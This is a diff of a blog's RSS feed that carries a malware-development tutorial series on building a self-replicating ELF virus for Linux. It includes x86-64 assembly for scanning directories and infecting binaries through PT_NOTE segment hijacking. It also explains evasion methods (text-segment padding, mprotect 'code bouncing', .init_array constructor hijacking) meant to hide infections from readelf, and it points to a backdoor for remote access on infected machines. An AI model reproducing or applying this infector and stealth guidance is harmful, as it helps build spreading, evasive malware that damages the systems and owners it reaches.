+&lt;p&gt;Good job, we made our very simple but also very effective backdoor. I might write another article later about how to make a more evolved backdoor that includes network-traffic encoding, ICMP exfiltration and other fancy features that will make it stealthier. Now that we have a proper malicious payload in our infector, let&amp;rsquo;s imagine that a reverse-engineer wants to try to check it out, it would be great to make its task harder with obfuscation. You can check that &lt;a href=&#34;https://alagroy-42.github.io/malware_dev/obfuscation_techniques&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
 </content>
     </item>
     
@@ -42,16 +419,16 @@
       
       <guid>https://alagroy-42.github.io/malware_dev/infector_advanced/</guid>
       <description>Introduction In our last post, we saw how to make a simple virus that propagates inside ELF 64-bits files but we saw at the end that the way we did it was not really stealthy and the whole point of a malware is to be stealthy to avoid being spotted and removed. To remedy to that, we will now use a new technique that won&amp;rsquo;t raise any suspicions when the infected binary is being inspected with the readelf command.</description>
-      <content>&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+      <content>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
 &lt;p&gt;In our &lt;a href=&#34;https://alagroy-42.github.io/malware_dev/infector_basics&#34;&gt;last post&lt;/a&gt;, we saw how to make a simple virus that propagates inside ELF 64-bits files but we saw at the end that the way we did it was not really stealthy and the whole point of a malware is to be stealthy to avoid being spotted and removed. To remedy to that, we will now use a new technique that won&amp;rsquo;t raise any suspicions when the infected binary is being inspected with the &lt;code&gt;readelf&lt;/code&gt; command. It means neither the number of segments nor their permissions should be changed and the entrypoint will also remain the same. Since our last post has been really detailed about the code, we will now just see the concepts to write a better virus. If you are interested in the code, I did a virus that implements all of these techniques that you can find &lt;a href=&#34;https://github.com/alagroy-42/Famine&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
-&lt;h3 id=&#34;how-do-we-do-that-&#34;&gt;How do we do that ?&lt;/h3&gt;
+&lt;h2 id=&#34;how-do-we-do-that-&#34;&gt;How do we do that ?&lt;/h2&gt;
 &lt;p&gt;We will break down this problem in two parts, the first one will be finding a place where we can inject ourself and then we will find a way to get control of the execution flow to execute our payload. To avoid changing the number of load segment, since they are the only one that are mapped into memory, we know that we are going to have to put them here. There are two well-known infection techniques that would respect the constraints and that are safe:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;The reverse text segment padding&lt;/li&gt;
 &lt;li&gt;The text segment padding&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Those techniques are really efficient and simple to implement but they have the major inconvenient that the padding size depends on the file and we might not be able to inject our payload. That&amp;rsquo;s why we will implement a handcrafted technique of mine which is the code bouncing one. We will explain why later but that technique is not optimal so we will only use it as a backup solution if we cannot insert ourself on the text segment padding.&lt;/p&gt;
-&lt;h3 id=&#34;the-optimal-solution--the-text-segment-padding&#34;&gt;The optimal solution : the text segment padding&lt;/h3&gt;
+&lt;h2 id=&#34;the-optimal-solution--the-text-segment-padding&#34;&gt;The optimal solution : the text segment padding&lt;/h2&gt;
 &lt;p&gt;The two known techniques evoked above are quite similar in terms of result so I chose the second one which is the &amp;ldquo;normal&amp;rdquo; text segment padding insertion.&lt;/p&gt;
 &lt;p&gt;The ELF format has been made so that memory mapping of file parts is being made easy thanks to the congruency between offsets and address, modulo a page size, which is usually 4096 bytes. That being said, since everything on the same page has the same permissions, code and data cannot be on the same page. That would be a disaster for security if data had execution permissions or if we could rewrite the code. To put code and data on different pages while keeping the offsets aligned on the memory, the only solution is to put some padding after the code segment. Those are unused null bytes, that we can replace with our code.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/infector_adv_page.png&#34; alt=&#34;pages&#34;&gt;&lt;/p&gt;
@@ -64,7 +441,7 @@ To check that we can put our payload inside the padding we can just compute this
 &lt;li&gt;increase the last section of the segment (usually &lt;code&gt;.fini&lt;/code&gt;) so that our payload fit in a section to avoid any suspicion.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Now, if everything has been done correctly, the only remaining thing to do is to hijack the execution flow but first let&amp;rsquo;s see whta we can do in case our payload doesn&amp;rsquo;t fit.&lt;/p&gt;
-&lt;h3 id=&#34;the-backup-solution--the-code-bouncing&#34;&gt;The backup solution : the code bouncing&lt;/h3&gt;
+&lt;h2 id=&#34;the-backup-solution--the-code-bouncing&#34;&gt;The backup solution : the code bouncing&lt;/h2&gt;
 &lt;p&gt;When we don&amp;rsquo;t have enough place to insert ourselves in the text segment padding, there is still somewhere we can go whatever the size of our payload is : the end of the last segment. Indeed, we can extend it as much as we want to adapt to any payload but the last load segment is usually the data segment which brings two problems:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;the BSS : this section used for uninitialized global and static variables is present in memory but not in the file&lt;/li&gt;
@@ -79,11 +456,11 @@ To check that we can put our payload inside the padding we can just compute this
 &lt;p&gt;It will mean shifting everything that comes after the BSS before writing it and the payload and once we&amp;rsquo;ve done that, we will update the offsets of every section that follows the BSS and the offset of the section header table in the ELF header. With that done, the file structure will remain the same and nothing should be broke, at least not on the execution point of view because nothing is mapped after the BSS. Since we&amp;rsquo;ve updated the offsets, we can still use &lt;code&gt;readelf -t&lt;/code&gt; to check the sections. Everything should be coherent for now but we have to modify the BSS section header which will bring some little abnormal things to &lt;code&gt;readelf&lt;/code&gt;. We have to change its type to &lt;code&gt;SHT_PROGBITS&lt;/code&gt; instead of &lt;code&gt;SHT_NOBITS&lt;/code&gt; to get it mapped into memory. We also have to update the size of the BSS to include our payload but also the sizes of the data segment without forgetting that it already counted the BSS but only in the &lt;code&gt;p_memsz&lt;/code&gt; field. Once that is done, we have our code placed in memory but on a non-executable segment, which is a problem because we will segfault if we execute it. We cannot change it in the file to avoid being spotted too easily but we can try to change it at runtime. That is what the code bouncing technique is about.&lt;/p&gt;
 &lt;p&gt;To resolve our current issue, we will insert a short chunk of code in the text padding segment that will grant the execution permission to the data segment using the &lt;code&gt;mprotect&lt;/code&gt; syscall. Once it has made the data segment executable, it will just jump on it to execute it.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/infector_adv_code_bounce.png&#34; alt=&#34;pages&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;what-about-the-execution-flow-&#34;&gt;What about the execution flow ?&lt;/h3&gt;
+&lt;h2 id=&#34;what-about-the-execution-flow-&#34;&gt;What about the execution flow ?&lt;/h2&gt;
 &lt;p&gt;We achieved our first goal : we have an executable payload mapped into memory no matter its size, the only limit is that the code padding is able to host the code bounce code chunk (≈ 20 bytes). All of that without modifying the number of load segments nor their permissions. There is not any suspicious red flag when looking at the &lt;code&gt;readelf&lt;/code&gt; command on an infected program. For now, our payload is useless though since it is not being executed. Our second task will be executing it without changing the entrypoint.&lt;/p&gt;
 &lt;p&gt;To do so, we have to find something that gets executed no matter what but that is not the entrypoint. Have you ever tried to compile a simple Hello World in C and then inspect what is in the binary. If not, you should and you will see that there is actually way more than just the main. There is a lot happening before the main gets executed. But the entrypoint is not even main, it usually points on &lt;code&gt;_start&lt;/code&gt;, a wrapper that will call main with the correct arguments. But before that, the loader is doing a lot, it has to map everything, update the relocation call some initialization functions etc&amp;hellip; If you want to know more what happens before the execution of main you can (and you should) read &lt;a href=&#34;http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html&#34;&gt;this article&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;Now that we know all of that, we have a pretty good idea about how we can hijack the execution of a program without changing the entrypoint. There are many ways to do it, I have chosen the constructor hijacking solution. Every program usually has a constructor, some have more (usually C++ programs). If you ever wandered in an executable using &lt;code&gt;objdump&lt;/code&gt;, you have probably already seen the &lt;code&gt;frame_dummy&lt;/code&gt; function that is useless to most of the programs but it is there. It is the only constructor for a normal C program. The addresses of the constructors are stored in a function pointer array present in the &lt;code&gt;.init_array&lt;/code&gt; section. The &lt;code&gt;_init&lt;/code&gt; function, called at the very beginning of a program calls each one of this array entries. To get our payload executed, we simply have to override the first entry of this array with the address of our payload. The advantage of this double technique is that both have their starting point at the same place (in the text segment padding) so we don&amp;rsquo;t have to take the payload place into account when we override the address. Now this should work for normal executables but there is still a problem to handle. On PIE executable, the &lt;code&gt;.init_array&lt;/code&gt; entries are in the relocation table (in the &lt;code&gt;.rela.dyn&lt;/code&gt; section) which means that the loader is actually gonna replace their address by the value indicated in the relocation field so we also have to modify the &lt;code&gt;r_addend&lt;/code&gt; field of these to indicate to the program where the function is gonna be once the executable has been mapped in a random place.&lt;/p&gt;
-&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
 &lt;p&gt;Now that all of that is patched, we have a working ELF infector that does not show anything suspicious on the &lt;code&gt;readelf&lt;/code&gt; command and that does not change the entrypoint either. That is a good start for a stealth malware. On our way to stealthiness, we will learn a few more things like code obfuscation or oligomorphism (self-encryption) but first, let&amp;rsquo;s have some fun and &lt;a href=&#34;https://alagroy-42.github.io/malware_dev/simple_backdoor&#34;&gt;let&amp;rsquo;s add a backdoor to our virus to gain remote access on infected computers&lt;/a&gt;.&lt;/p&gt;
 </content>
     </item>
@@ -95,10 +472,10 @@ To check that we can put our payload inside the padding we can just compute this
       
       <guid>https://alagroy-42.github.io/malware_dev/infector_basics/</guid>
       <description>Introduction During this post, we will learn how to code a simple ELF infector on Linux. This infector will spread and sel-replicate inside the other binaries that it finds. It will get executed when infected binaries are launched so that it can spread even more. The payload will be harmless, just a signature to attest that the binary has been infected. This infector will be very basic and undisguised at all, any reverse-engineer could see that a file has been infected by executing a simple readelf command (We will get more into that later).</description>
-      <content>&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+      <content>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
 &lt;p&gt;During this post, we will learn how to code a simple ELF infector on Linux. This infector will spread and sel-replicate inside the other binaries that it finds. It will get executed when infected binaries are launched so that it can spread even more. The payload will be harmless, just a signature to attest that the binary has been infected. This infector will be very basic and undisguised at all, any reverse-engineer could see that a file has been infected by executing a simple &lt;code&gt;readelf&lt;/code&gt; command (We will get more into that later).&lt;/p&gt;
 &lt;p&gt;You can check the full source code &lt;a href=&#34;https://github.com/alagroy-42/note_infector&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;how-does-it-work-&#34;&gt;How does it work ?&lt;/h3&gt;
+&lt;h2 id=&#34;how-does-it-work-&#34;&gt;How does it work ?&lt;/h2&gt;
 &lt;p&gt;The technique that we will use here is called PT_NOTE segment hijacking. To understand how it works, we first need to understand the ELF format. The first element of an ELF file is the ELF header, it gives us the info we need to understand and read the rest of the file. Then comes the Program Header table, it will describe how the file is being organized. Each program header describes a part of the file, a part can belong to several program headers. Each entry is described by the following C structure (&lt;code&gt;man elf&lt;/code&gt; for more information).&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;   p_type;
@@ -140,8 +517,8 @@ To check that we can put our payload inside the padding we can just compute this
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_shstrndx;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           } ElfN_Ehdr;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The field that interests us here is &lt;code&gt;e_entry&lt;/code&gt; which will define the entrypoint of our program. If we put our code, the program will execute it and we will just have to transfer the execution back to the original entrypoint so that the program can keep its course.&lt;/p&gt;
-&lt;h3 id=&#34;the-code&#34;&gt;The code&lt;/h3&gt;
-&lt;h4 id=&#34;filesystem-reading&#34;&gt;Filesystem reading&lt;/h4&gt;
+&lt;h2 id=&#34;the-code&#34;&gt;The code&lt;/h2&gt;
+&lt;h3 id=&#34;filesystem-reading&#34;&gt;Filesystem reading&lt;/h3&gt;
 &lt;p&gt;The first thing to do will be finding files to infect. For safety reason and because we don&amp;rsquo;t want to launch our program as root, we will not look for those in &lt;code&gt;/bin&lt;/code&gt; or &lt;code&gt;/usr/bin&lt;/code&gt; but in &lt;code&gt;/tmp/test&lt;/code&gt; and &lt;code&gt;/tmp/test2&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;_start:
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;    rbp
@@ -242,7 +619,7 @@ To check that we can put our payload inside the padding we can just compute this
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;leave&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;ret&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With the &lt;code&gt;readdir&lt;/code&gt; function, we will loop through all the &lt;code&gt;linux_dirent64&lt;/code&gt; structures present in each of the target directories. If the current structure describes a regular file, we will call the &lt;code&gt;infect&lt;/code&gt; function with its name as argument to try to infect it.&lt;/p&gt;
-&lt;h4 id=&#34;preliminary-checks&#34;&gt;Preliminary checks&lt;/h4&gt;
+&lt;h3 id=&#34;preliminary-checks&#34;&gt;Preliminary checks&lt;/h3&gt;
 &lt;p&gt;The &lt;code&gt;infect&lt;/code&gt; function will be the main function of our program. To make the code more clean, I&amp;rsquo;ve defined a structure called &lt;code&gt;Infection_struct&lt;/code&gt; in &lt;code&gt;defines.s&lt;/code&gt; that will allow me, by considering the stack frame as this structure to use its fields as local variable names.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;infect:
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;    rbp
@@ -337,7 +714,7 @@ To check that we can put our payload inside the padding we can just compute this
 &lt;li&gt;the &lt;code&gt;PT_NOTE&lt;/code&gt; phdr address&lt;/li&gt;
 &lt;li&gt;the last &lt;code&gt;PT_LOAD&lt;/code&gt; phdr address&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h4 id=&#34;infection&#34;&gt;Infection&lt;/h4&gt;
+&lt;h3 id=&#34;infection&#34;&gt;Infection&lt;/h3&gt;
 &lt;p&gt;Once we have every needed information, we can get to the serious part.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;patch_note_phdr:
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rax, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr]
@@ -452,7 +829,7 @@ To check that we can put our payload inside the padding we can just compute this
 We can obtain this offset with the formula : &lt;code&gt;old_entrypoint_address - final_jmp_offset&lt;/code&gt;.
 Once we replaced the jmp address in the copied code, everything is set but there is still one thing to do for the infector to fully work : preserve its registers.
 Indeed, the host program code might expect some special values in some register that we used (like &lt;code&gt;argc&lt;/code&gt; and &lt;code&gt;argv&lt;/code&gt; in &lt;code&gt;rdi&lt;/code&gt; and &lt;code&gt;rsi&lt;/code&gt;) so we will push those important registers at the very beginning of our program and pop them just before the final jump.&lt;/p&gt;
-&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
 &lt;p&gt;We can now infect any ELF 64-bits of our system and get anything executed executed by it if we insert a real payload inside but we have a problem : our technique is not stealthy at all, we can be spotted by &lt;code&gt;readelf&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;readelf&lt;/code&gt; is a linux command that allows us to inspect ELF files, we will use it with the &lt;code&gt;-l&lt;/code&gt; option to display the program headers of a simple Hello World coded in C before and after infection.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Elf file type is DYN (Shared object file)
